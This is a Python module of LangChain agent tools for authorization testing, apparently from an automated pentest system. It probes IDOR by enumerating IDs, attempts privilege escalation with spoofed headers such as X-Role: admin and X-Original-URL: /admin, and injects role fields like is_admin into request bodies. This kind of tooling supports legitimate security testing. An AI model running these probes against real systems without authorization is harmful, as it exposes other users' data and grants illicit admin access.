"""Authorization attack tools.

Migrated from Shannon's exploit-authz prompt.  Covers:
  - IDOR (Insecure Direct Object Reference) testing
  - Vertical privilege escalation via header injection
  - Role/permission manipulation in request body
  - Workflow/state bypass probing
"""

from __future__ import annotations

import itertools
import json
import re
from typing import Any
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

from langchain_core.tools import tool

from .http_client import normalize_url, request
from .results import Evidence, Finding, RequestRecord, ToolResult, error_result, response_record

# ── Privilege escalation header patterns (from Shannon) ────────────────

PRIV_ESCALATION_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-Host", "localhost"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Role", "admin"),
    ("X-Admin", "true"),
    ("X-User-Role", "administrator"),
    ("X-User-Id", "1"),
    ("X-Auth-User", "admin"),
    ("X-Email", "admin@localhost"),
    ("X-API-Key", "admin"),
    ("X-Internal", "true"),
    ("X-Forwarded-Prefix", "/admin"),
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-Original-Method", "GET"),
    ("Referer", "http://localhost/admin/"),
    ("Origin", "http://localhost"),
]

IDOR_PATTERNS = [
    # Sequential ID enumeration
    ("id", 3, "Numeric ID parameter"),
    ("user_id", 3, "User ID parameter"),
    ("userId", 3, "CamelCase user ID"),
    ("uid", 3, "Short UID parameter"),
    ("order_id", 3, "Order ID parameter"),
    ("account", 3, "Account identifier"),
    ("profile", 3, "Profile identifier"),
    ("document", 3, "Document identifier"),
    ("file", 3, "File identifier"),
    ("uuid", 1, "UUID parameter (single test)"),
]


def _build_idor_payloads(base_url: str, param: str, count: int) -> list[tuple[str, str]]:
    """Generate IDOR enumeration payloads for numeric and common IDs."""
    parsed = urlparse(base_url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    current_value = next((v for k, v in pairs if k == param), "")

    payloads: list[tuple[str, str]] = []

    # Try numeric enumeration
    numeric_match = re.match(r"^(\d+)$", current_value)
    if numeric_match:
        current_num = int(numeric_match.group(1))
        # Test sequential values
        for offset in range(1, min(count + 1, 6)):
            test_num = current_num + offset
            probe_url = urlunparse(parsed._replace(query=urlencode(
                [(k, str(test_num) if k == param else v) for k, v in pairs], doseq=True
            )))
            payloads.append((str(test_num), probe_url))
        # Test small numbers (admin/common users)
        for test_num in (0, 1, 2):
            if test_num != current_num:
                probe_url = urlunparse(parsed._replace(query=urlencode(
                    [(k, str(test_num) if k == param else v) for k, v in pairs], doseq=True
                )))
                payloads.append((str(test_num), probe_url))
    else:
        # UUID or string ID — test common variants
        test_values = ["1", "admin", "0", "root", "self", "me"]
        for val in test_values:
            if val != current_value:
                probe_url = urlunparse(parsed._replace(query=urlencode(
                    [(k, val if k == param else v) for k, v in pairs], doseq=True
                )))
                payloads.append((val, probe_url))

    return payloads


def _is_authz_bypass(
    original_status: int,
    probe_status: int,
    original_len: int,
    probe_len: int,
    original_text: str,
    probe_text: str,
) -> tuple[bool, str]:
    """Heuristic to detect authorization bypass."""
    if probe_status == 200 and original_status in (401, 403):
        return True, f"Auth bypass: {original_status} → 200"
    if probe_status == 200 and abs(probe_len - original_len) > 100:
        # Same status but significantly different content — possible IDOR
        if "error" not in probe_text.lower()[:200] and "unauthorized" not in probe_text.lower()[:200]:
            return True, "Different user/object data returned (possible IDOR)"
    if probe_status == original_status and probe_len != original_len and abs(probe_len - original_len) > 200:
        return True, "Content differs significantly at same status (possible IDOR)"
    return False, ""


# ── Public Tools ──────────────────────────────────────────────────────


@tool
def test_idor(
    url: str,
    param: str = "",
    method: str = "GET",
    headers_json: str = "",
    sessions_json: str = "",
) -> str:
    """Test for Insecure Direct Object Reference (IDOR) by enumerating IDs.

    Probes sequential and common identifier values through the target parameter
    and compares response content against the original to detect unauthorized
    access to other users' data.

    Parameters:
        url: Target URL with an object identifier parameter (e.g. ?id=42).
        param: The parameter name to test. Auto-detected if empty.
        method: GET or POST.
        headers_json: Optional JSON for custom request headers (e.g. auth tokens).
        sessions_json: JSON array of alternate session cookies/headers to test
                       horizontal privilege boundaries. Format:
                       [{"Cookie": "session=user2_value"}, ...]
    """
    target = normalize_url(url)
    method_norm = method.strip().upper()
    if method_norm not in ("GET", "POST"):
        return error_result("test_idor", target, "unsupported method").to_text()

    # Parse custom headers
    custom_headers = {}
    if headers_json:
        try:
            custom_headers = json.loads(headers_json)
        except json.JSONDecodeError:
            return error_result("test_idor", target, "headers_json 解析失败，请使用 JSON 格式").to_text()

    # Auto-detect ID parameter
    parsed = urlparse(target)
    query_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if not param:
        for candidate, _, _ in IDOR_PATTERNS:
            if candidate in query_params:
                param = candidate
                break
    if not param and query_params:
        # Pick the first numeric-looking param
        for k, v in query_params.items():
            if v.isdigit():
                param = k
                break
        if not param:
            param = next(iter(query_params), "")
    if not param:
        return error_result("test_idor", target, "未发现可测试的 ID 参数。请手动指定 param。").to_text()

    # Get baseline response
    try:
        baseline = request(method_norm, target, headers=custom_headers, timeout=10)
    except Exception as exc:
        return error_result("test_idor", target, f"baseline failed: {exc}").to_text()

    # Generate IDOR probes
    idor_payloads = _build_idor_payloads(target, param, 4)

    attempts: list[dict[str, Any]] = []
    findings: list[Finding] = []
    errors: list[dict[str, str]] = []

    for test_value, probe_url in idor_payloads[:8]:
        try:
            resp = request(method_norm, probe_url, headers=custom_headers, timeout=10)
            bypass, reason = _is_authz_bypass(
                baseline.status_code, resp.status_code,
                len(baseline.text), len(resp.text),
                baseline.text, resp.text,
            )
            attempt = {
                "test_value": test_value,
                "url": probe_url,
                "status": resp.status_code,
                "length": len(resp.text),
                "bypass": bypass,
                "reason": reason,
                "preview": (resp.text or "")[:200],
            }
            attempts.append(attempt)

            if bypass:
                findings.append(Finding(
                    title=f"IDOR 漏洞：参数 {param} 取值 {test_value} 返回了非授权数据",
                    severity="high",
                    confidence="confirmed" if resp.status_code == 200 and baseline.status_code != 200 else "likely",
                    category="idor",
                    evidence=[Evidence(
                        "idor_probe",
                        reason,
                        probe_url,
                        {"test_value": test_value, "original_status": baseline.status_code, "probe_status": resp.status_code},
                    )],
                    reproduction=[
                        f"1. 以正常用户身份访问 {target}",
                        f"2. 将参数 {param} 修改为 {test_value}",
                        f"3. 观察是否返回了其他用户的数据",
                    ],
                ))
        except Exception as exc:
            errors.append({"kind": "connection_error", "message": f"value={test_value}: {exc}"})

    confidence = "confirmed" if findings else ("weak" if any(a.get("bypass") for a in attempts) else "unconfirmed")

    lines = [
        f"[test_idor] {target}",
        f"Parameter: {param}",
        f"Baseline: {baseline.status_code} {len(baseline.text)} chars",
        f"Probes: {len(attempts)}",
        f"Finding: {len(findings)} potential IDORs",
        "",
    ]
    for a in attempts[:6]:
        marker = "⚠️" if a["bypass"] else "  "
        lines.append(f"  {marker} {a['test_value']} → status={a['status']} len={a['length']}")

    readable = "\n".join(lines)

    return ToolResult(
        tool="test_idor",
        target=target,
        status="ok",
        summary=f"IDOR 检测：{len(findings)} 个可疑越权 ({confidence})",
        raw_excerpt=readable,
        findings=findings,
        errors=errors,
        request=RequestRecord(method_norm, target, parameters={"param": param}),
        response=response_record(baseline),
        data={"attempts": attempts, "param": param},
    ).to_text()


@tool
def test_privilege_escalation(
    url: str,
    method: str = "GET",
    headers_json: str = "",
    body: str = "",
) -> str:
    """Test for vertical privilege escalation using header injection.

    Sends requests with privilege-escalation headers (X-Role, X-Admin, etc.)
    and checks whether the server grants elevated access.  This technique is
    directly from Shannon's exploit-authz module.

    Parameters:
        url: Target endpoint to test (preferably an admin/privileged endpoint).
        method: GET or POST.
        headers_json: Original auth headers in JSON (e.g. low-privilege session).
        body: Request body for POST.
    """
    target = normalize_url(url)
    method_norm = method.strip().upper()
    if method_norm not in ("GET", "POST"):
        return error_result("test_privilege_escalation", target, "unsupported method").to_text()

    custom_headers = {}
    if headers_json:
        try:
            custom_headers = json.loads(headers_json)
        except json.JSONDecodeError:
            pass

    # Baseline without escalation headers
    try:
        baseline = request(method_norm, target, headers=dict(custom_headers), timeout=10)
    except Exception as exc:
        return error_result("test_privilege_escalation", target, f"baseline failed: {exc}").to_text()

    results: list[dict[str, Any]] = []
    findings: list[Finding] = []

    # Pre-filter: skip headers likely to be irrelevant
    # Only test against endpoints that returned 401/403/404 (likely protected)
    if baseline.status_code not in (401, 403, 404):
        # Still test — the endpoint might return different data for admin
        pass

    for header_name, header_value in PRIV_ESCALATION_HEADERS:
        test_headers = dict(custom_headers)
        test_headers[header_name] = header_value

        try:
            resp = request(method_norm, target, headers=test_headers, timeout=10)
            escalated = False
            reason = ""

            if baseline.status_code in (401, 403) and resp.status_code == 200:
                escalated = True
                reason = f"Privilege escalation via {header_name}: {baseline.status_code} → 200"
            elif baseline.status_code == 404 and resp.status_code == 200:
                escalated = True
                reason = f"Hidden endpoint revealed via {header_name}: 404 → 200"
            elif resp.status_code == 200 and len(resp.text) != len(baseline.text):
                if abs(len(resp.text) - len(baseline.text)) > 200:
                    escalated = True
                    reason = f"Different content via {header_name} (len diff={abs(len(resp.text) - len(baseline.text))})"

            result = {
                "header": f"{header_name}: {header_value}",
                "status": resp.status_code,
                "length": len(resp.text),
                "escalated": escalated,
                "reason": reason,
            }
            results.append(result)

            if escalated:
                findings.append(Finding(
                    title=f"垂直提权：{header_name} 头注入绕过授权",
                    severity="critical",
                    confidence="confirmed" if baseline.status_code in (401, 403) else "likely",
                    category="privilege_escalation",
                    evidence=[Evidence(
                        "header_injection",
                        reason,
                        target,
                        {"header": header_name, "value": header_value, "baseline_status": baseline.status_code},
                    )],
                    reproduction=[
                        f"1. 以低权限用户访问 {target} → 收到 {baseline.status_code}",
                        f"2. 添加请求头 {header_name}: {header_value}",
                        f"3. 观察到 {resp.status_code}，获得越权访问",
                    ],
                ))
        except Exception as exc:
            results.append({"header": f"{header_name}: {header_value}", "status": "error", "escalated": False, "reason": str(exc)[:100]})

    escalated_count = sum(1 for r in results if r.get("escalated"))
    lines = [
        f"[test_privilege_escalation] {target}",
        f"Baseline: {baseline.status_code} {len(baseline.text)} chars",
        f"Tested: {len(results)} escalation headers",
        f"Escalated: {escalated_count}",
        "",
    ]
    for r in results:
        marker = "⚠️" if r["escalated"] else "  "
        lines.append(f"  {marker} {r['header']} → {r['status']} {'(' + r['reason'] + ')' if r['reason'] else ''}")

    readable = "\n".join(lines)

    return ToolResult(
        tool="test_privilege_escalation",
        target=target,
        status="ok",
        summary=f"垂直提权检测：{escalated_count}/{len(results)} 个头注入绕过",
        raw_excerpt=readable,
        findings=findings,
        request=RequestRecord(method_norm, target),
        response=response_record(baseline),
        data={"results": results, "escalated_count": escalated_count},
    ).to_text()


@tool
def test_role_manipulation(
    url: str,
    method: str = "POST",
    body_json: str = "",
    headers_json: str = "",
) -> str:
    """Test for role/permission manipulation in request bodies.

    Attempts to modify role, permissions, is_admin, or group fields in the
    request body to check if the server accepts unauthorized privilege changes.

    Parameters:
        url: Target endpoint (e.g. user profile update, registration).
        method: HTTP method (typically POST, PUT, or PATCH).
        body_json: Original request body in JSON format.
        headers_json: Optional auth headers in JSON.
    """
    target = normalize_url(url)
    method_norm = method.strip().upper()
    if method_norm not in ("GET", "POST", "PUT", "PATCH"):
        return error_result("test_role_manipulation", target, "unsupported method").to_text()

    try:
        original_body = json.loads(body_json) if body_json else {}
    except json.JSONDecodeError:
        return error_result("test_role_manipulation", target, "body_json 解析失败").to_text()

    custom_headers = {}
    if headers_json:
        try:
            custom_headers = json.loads(headers_json)
        except json.JSONDecodeError:
            pass

    # Baseline
    try:
        baseline = request(method_norm, target, json=original_body, headers=custom_headers, timeout=10)
    except Exception:
        try:
            # Fallback: send as form data
            baseline = request(method_norm, target, data=original_body, headers=custom_headers, timeout=10)
        except Exception as exc:
            return error_result("test_role_manipulation", target, f"baseline failed: {exc}").to_text()

    # Role manipulation payloads
    manipulations = [
        ({"role": "admin"}, "Set role=admin"),
        ({"roles": ["admin"]}, "Set roles=[admin]"),
        ({"is_admin": True}, "Set is_admin=True"),
        ({"isAdmin": True}, "Set isAdmin=True"),
        ({"is_superuser": True}, "Set is_superuser=True"),
        ({"permission": "admin"}, "Set permission=admin"),
        ({"group": "admin"}, "Set group=admin"),
        ({"access_level": 99}, "Set access_level=99"),
        ({"userType": "admin"}, "Set userType=admin"),
        ({"account_type": "premium"}, "Set account_type=premium"),
    ]

    results: list[dict[str, Any]] = []
    findings: list[Finding] = []

    for mod, description in manipulations:
        modified_body = dict(original_body)
        modified_body.update(mod)

        try:
            resp = request(method_norm, target, json=modified_body, headers=custom_headers, timeout=10)
        except Exception:
            try:
                resp = request(method_norm, target, data=modified_body, headers=custom_headers, timeout=10)
            except Exception as exc:
                results.append({"modification": description, "status": "error", "accepted": False, "error": str(exc)[:100]})
                continue

        # Detection: 200 OK + no error message = potentially accepted
        text_lower = (resp.text or "").lower()[:500]
        error_keywords = ("error", "unauthorized", "forbidden", "invalid", "denied", "not permitted")
        accepted = resp.status_code == 200 and not any(kw in text_lower for kw in error_keywords)

        result = {
            "modification": description,
            "status": resp.status_code,
            "accepted": accepted,
            "length": len(resp.text),
            "preview": (resp.text or "")[:200],
        }
        results.append(result)

        if accepted:
            findings.append(Finding(
                title=f"角色操控：{description} 被服务器接受",
                severity="critical",
                confidence="confirmed",
                category="privilege_escalation",
                evidence=[Evidence(
                    "role_manipulation",
                    f"Modified body accepted: {description} → status {resp.status_code}",
                    target,
                    {"modification": mod, "original_body": original_body},
                )],
                reproduction=[
                    f"1. 发送 {method_norm} {target}",
                    f"2. 在请求体中添加/修改: {json.dumps(mod)}",
                    f"3. 服务器返回 {resp.status_code}，未拒绝提权请求",
                ],
            ))

    accepted_count = sum(1 for r in results if r.get("accepted"))
    lines = [
        f"[test_role_manipulation] {target}",
        f"Original body: {json.dumps(original_body)}",
        f"Baseline: {baseline.status_code} {len(baseline.text)} chars",
        f"Tested: {len(manipulations)} role manipulations",
        f"Accepted: {accepted_count}",
        "",
    ]
    for r in results:
        marker = "⚠️" if r.get("accepted") else "  "
        lines.append(f"  {marker} {r['modification']} → {r['status']} {'ACCEPTED' if r.get('accepted') else ''}")

    readable = "\n".join(lines)

    return ToolResult(
        tool="test_role_manipulation",
        target=target,
        status="ok",
        summary=f"角色操控检测：{accepted_count}/{len(manipulations)} 个请求被接受",
        raw_excerpt=readable,
        findings=findings,
        request=RequestRecord(method_norm, target),
        response=response_record(baseline),
        data={"results": results, "accepted_count": accepted_count},
    ).to_text()
